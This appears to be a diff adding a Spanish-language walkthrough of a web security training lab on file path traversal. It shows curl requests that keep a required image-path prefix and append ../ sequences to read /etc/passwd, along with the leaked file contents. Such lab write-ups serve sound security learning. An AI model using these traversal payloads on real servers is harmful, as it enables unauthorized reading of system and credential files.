@@ -169,3 +169,28 @@ lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
 
 ## 5. Lab: File path traversal, validation of start of path
 
+```bash
+https://acf31f4d1e13f43680eae142000a009b.web-security-academy.net/image?filename=/var/www/images/41.jpg
+```
+
+Verificamos si el metodo a usar del laboratorio anterior es suficiente.
+
+```bash
+└──╼ $curl 'https://acf31f4d1e13f43680eae142000a009b.web-security-academy.net/image?filename=..%252f..%252f..%252fetc%252fpasswd'
+"Missing parameter 'filename'"
+```
+
+Al parecer como vemos en la url de la imagen, **/var/www/images/41.jpg**, sigue un parametro de ruta inicial **/var/www/images/**, lo que haremos será dejarlo así pero acontinuacion agregar retrocesos de directorios **../** hasta lograr llegar a la raiz y agregarle el **/etc/passwd**.
+
+```bash
+└──╼ $curl 'https://acf31f4d1e13f43680eae142000a009b.web-security-academy.net/image?filename=/var/www/images/../../../etc/passwd'
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+....
+```
+
+## 6. Lab: File path traversal, validation of file extension with null byte bypass
+
